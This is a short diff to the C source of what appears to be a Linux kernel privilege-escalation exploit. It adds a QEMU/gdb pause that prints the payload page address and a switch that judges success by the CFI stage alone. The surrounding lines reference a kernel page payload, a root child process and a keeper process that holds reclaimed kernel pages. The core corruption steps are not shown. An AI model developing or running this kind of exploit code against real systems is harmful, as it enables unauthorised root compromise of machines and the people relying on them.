@@ -472,6 +472,12 @@ int run_exploit(int argc, char **argv) {
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
 #endif
 
+#ifdef QEMU_GDB_HOLD_SECONDS
+  pr_info("qemu gdb hold seconds=%d base=%016zx\n",
+          QEMU_GDB_HOLD_SECONDS, page_base);
+  sleep(QEMU_GDB_HOLD_SECONDS);
+#endif
+
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (!page_base) {
     return 1;
@@ -610,11 +616,15 @@ int run_exploit(int argc, char **argv) {
     SYSCHK(kill(pipe_prepare_child, SIGKILL));
     SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
   }
+#if defined(QEMU_STACK_WRITER_ONLY) && QEMU_STACK_WRITER_ONLY
+  int exploit_ok = atomic_load(&cfi_stage_done);
+#else
   int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
   if (exploit_ok) {
     pid_t keeper = spawn_allocation_keeper();
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
   }
+#endif
   return exploit_ok ? 0 : 1;
 }
